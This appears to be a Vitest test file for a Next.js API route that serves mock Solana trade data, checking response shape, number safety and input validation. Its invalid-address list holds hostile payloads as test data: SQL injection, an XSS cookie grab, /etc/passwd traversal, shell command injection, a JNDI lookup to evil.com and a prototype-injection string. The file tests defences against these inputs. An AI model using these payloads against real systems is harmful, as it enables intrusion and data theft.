import { describe, it, expect, vi, beforeEach } from 'vitest';
import { GET } from '@/app/api/trades/[address]/route';

vi.stubGlobal('fetch', vi.fn());

const VALID_ADDRESS = 'So11111111111111111111111111111111111111112';

function params(address: string) {
  return { params: Promise.resolve({ address }) };
}

describe('GET /api/trades/[address]', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Valid requests', () => {
    it('returns 200', async () => {
      const res = await GET(new Request(`http://localhost/api/trades/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      expect(res.status).toBe(200);
    });

    it('returns { trades: [...] } structure', async () => {
      const res = await GET(new Request(`http://localhost/api/trades/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      const data = await res.json();
      expect(data).toHaveProperty('trades');
      expect(Array.isArray(data.trades)).toBe(true);
    });

    it('returns trades with required fields', async () => {
      const res = await GET(new Request(`http://localhost/api/trades/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      const data = await res.json();
      const trade = data.trades[0];
      expect(trade).toHaveProperty('txHash');
      expect(trade).toHaveProperty('type');
      expect(trade).toHaveProperty('price');
      expect(trade).toHaveProperty('amount');
      expect(trade).toHaveProperty('value');
      expect(trade).toHaveProperty('wallet');
      expect(trade).toHaveProperty('timestamp');
    });

    it('trade type is "buy" or "sell"', async () => {
      const res = await GET(new Request(`http://localhost/api/trades/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      const data = await res.json();
      for (const trade of data.trades) {
        expect(['buy', 'sell']).toContain(trade.type);
      }
    });

    it('price and amount are positive finite numbers', async () => {
      const res = await GET(new Request(`http://localhost/api/trades/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      const data = await res.json();
      for (const trade of data.trades) {
        expect(Number.isFinite(trade.price)).toBe(true);
        expect(trade.price).toBeGreaterThan(0);
        expect(Number.isFinite(trade.amount)).toBe(true);
        expect(trade.amount).toBeGreaterThan(0);
      }
    });

    it('mock trade wallet is abbreviated (does not expose full address)', async () => {
      const res = await GET(new Request(`http://localhost/api/trades/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      const data = await res.json();
      for (const trade of data.trades) {
        // Abbreviated like "7xKp...3Rft"
        expect(trade.wallet.includes('...')).toBe(true);
        // Wallet string should be short (< 20 chars typically)
        expect(trade.wallet.length).toBeLessThan(20);
      }
    });
  });

  describe('Invalid address — 400', () => {
    const badAddresses = [
      '',
      'x',
      'A'.repeat(50),
      "'; DROP TABLE trades;--",
      '<script>alert(document.cookie)</script>',
      '../../../etc/passwd',
      'addr|whoami',
      'addr`id`',
      '${jndi:ldap://evil.com}',
      '{{constructor.constructor("return process")()}}',
      '\x00nullbyte',
      '   ',
      '123456789012345678901234567890',  // 30 chars (< 32)
    ];

    badAddresses.forEach(addr => {
      it(`rejects: ${JSON.stringify(addr).slice(0, 35)}`, async () => {
        const res = await GET(new Request(`http://localhost/api/trades/${addr}`), params(addr));
        expect(res.status).toBe(400);
      });
    });
  });

  describe('Mock data NaN safety', () => {
    it('does not generate NaN prices for any valid address', async () => {
      const addresses = [
        'So11111111111111111111111111111111111111112',
        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263',
        'MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac',
      ];
      for (const addr of addresses) {
        const res = await GET(new Request(`http://localhost/api/trades/${addr}`), params(addr));
        const data = await res.json();
        for (const trade of data.trades) {
          expect(Number.isNaN(trade.price)).toBe(false);
          expect(Number.isNaN(trade.amount)).toBe(false);
          expect(Number.isNaN(trade.value)).toBe(false);
        }
      }
    });
  });

  describe('Information disclosure prevention', () => {
    it('error response does not echo back injection payload', async () => {
      const payload = '<script>alert(document.cookie)</script>';
      const res = await GET(new Request(`http://localhost/api/trades/${payload}`), params(payload));
      const text = await res.text();
      expect(text).not.toContain('<script>');
    });

    it('returns generic error message for invalid address', async () => {
      const res = await GET(new Request('http://localhost/api/trades/bad'), params('bad'));
      const data = await res.json();
      expect(data.error).toBeTruthy();
      expect(data.error).not.toContain('stack');
      expect(data.error).not.toContain('.ts:');
    });
  });
});
